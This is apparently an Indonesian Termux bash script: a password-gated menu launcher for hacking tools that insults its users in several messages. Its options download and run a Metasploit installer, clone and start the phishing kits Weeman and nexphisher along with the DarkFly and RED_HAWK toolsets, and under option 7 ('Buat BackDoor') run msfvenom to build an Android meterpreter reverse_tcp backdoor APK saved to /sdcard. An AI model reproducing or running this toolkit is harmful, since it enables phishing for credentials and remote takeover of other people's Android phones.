blue='\033[34;1m'  
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo "[+]=====================================[+]"
echo " | Author : Dark Night / Termux ID       |"
echo " | WhatsAp: 0858 0607 0813               |"
echo " | Youtube: Termux ID & Moczal Gaming    |"
echo " | Github : Https://github.com/Termux-1D |"
echo "[+]=====================================[+]"
echo
echo
echo "ketik 2 untuk Mendapatkan Username"
echo "Kalo Udah Tau Skip Aja... Caranya Ketik '0' "
echo
echo
read -p "Mendapatkan Username : " user
if [ $user = "2" ]
 then
 echo '$blue Username (  DARK-NIGHT  )'
 fi
read -p "Masukan Username  : " buka
read -p "Masukan Password  : " passwd
echo
if [ $passwd = "Clay•Team" ]
then
   sleep 4
  echo " Bener Ngab Tungguin Aja aaaa"
     sleep 3
   echo " Tungguin Aja"
     sleep 2
    echo " Cuma 5 Seconds"
      sleep 2
     echo " Bener Ngab Masukin Passwd Sama Usrname "
elif [ $buka = "DARK-NIGHT" ]
  then
   echo "Mantap Berhasil"
 else
  sleep 2
  echo "sory bg lu gagal masuk ke script gua"
  sleep 3
  echo "gua Kick lu Anjim"
 exit
 fi
  read -p " Masukan Username Anda Terlebih Dahulu : " usr
clear
figlet Welcome
 toilet -f big -F gay $usr
 echo
 echo
echo "$yellow----------------------------------------"
echo " Author: Dark Night                    |"
echo " Youtube : Moczal Gaming & Termux ID   |"
echo " WhatsApp : 62 858 0607 0813           |"
echo " Github : https://github.com/Termux-1D |"
echo "----------------------------------------"
echo
echo
 echo
 echo
 echo "$blue(1). Install Tools"
 echo "(2). Install Metasploit"
 echo "(3). Install DarkFly"
 echo "(4). install Red Hawk"
 echo "(5). Install Weeman"
 echo "(6). Install nexphisher"
 echo "(0). Exit / Keluar"
 echo
 echo "(7). Buat BackDoor"


          echo "(99). Tambahkan Kunci Termux"
 echo
     echo "(01). Kegunaan Install Tools"
     echo "(02). Kegunaan Meetasploit"
     echo "(03). Kegunaan DarkFly"
     echo "(04). Kegunaan Red Hawk"
     echo "(05). Kegunaan Weeman"
     echo "(06). Kegunaan Nexphisher"
     echo "(00). Kegunaan Exit / Keluar"
	 echo
	 echo
  read -p " Pilih Nomor Berapa $usr : " nomor
echo
clear
echo
if [ $nomor = "1" ]
then
  pkg upgrade
    pkg update
      pkg install curl -y
         pkg install python -y
           pkg install git -y
	     pkg install wget -y
	       pkg install python -y
 	         pkg install ruby -y
		   pkg install python2 -y
   		     pkg install oppenssh -y
		       pip install requests
			  pip install mechanize
			    pip2 install requests
			       pip2 install mechanize
				  gem install lolcat
				     pkg install toilet -y
				        pip install bs4
					   pip2 install bs4
					     termux-setup-storage

elif [ $nomor = "2" ]
then
  wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
  chmod 777 metasploit.sh
  ./metasploit.sh
   msfconsole
elif [ $nomor = "01" ]
then
echo " Ini Yah Kalian Tau Sendiri Lah Njir"
 echo " install dlu biar gak eror"
 echo "kegunaannya biar gak eror saat mau masuk ke tools"

elif [ $nomor = "02" ]
then
  echo " Maaf Script Ini Hanya Untuk Hacker Profesional Saja"
  echo " Jangan Di Salah Gunakan Yah Kak $usr"
  echo " Jika Anda Berbuat Sallah"
  echo " Author Tidak Bertanggung Jawab!"
  echo

elif [ $nomor = "3" ]
then
 git clone https://github.com/Ranginang67/DarkFly-Tool
 cd DarkFly-Tool
 python2 install.py
 figlet Run?~DarkFly

elif [ $nomor = "4" ]
then
 git clone https://github.com/Tuhinshubhra/RED_HAWK
 cd RED_HAWK
 php rhawk.php
 
elif [ $nomor = "5" ]
then
 git clone https://github.com/evait-security/weeman
 cd weeman
 python2 weeman.py

elif [ $nomor = "6" ]
then
 git clone https://github.com/htr-tech/nexphisher.git
 cd nexphisher
 bash setup
 bash tmux_setup
 bash nexphisher

elif [ $nomor = "7" ]
then
   msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8080 -o /sdcard/BackDoor.apk
   msfconsole

elif [ $nomor = "0" ]
then
   	echo " Ngapa Lu Keluar Njeng"

elif [ $nomor = "00" ]
then
	echo " Keluar Aj Gak Ada Gunanya Lu"
else
	echo " Ngawur Aj Dah Bangsad"
fi
